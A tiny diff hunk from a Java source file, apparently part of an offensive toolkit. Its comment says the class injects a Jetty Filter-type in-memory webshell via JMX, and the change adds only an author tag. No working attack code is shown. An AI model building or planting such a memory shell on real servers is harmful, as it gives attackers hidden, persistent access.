@@ -19,6 +19,7 @@ import static org.fusesource.jansi.Ansi.ansi;
 
 /**
  * 使用 JMX 注入 Jetty Filter 型内存马
+ * @author nu1r
  */
 public class JFMSFromJMXF implements Filter {
 
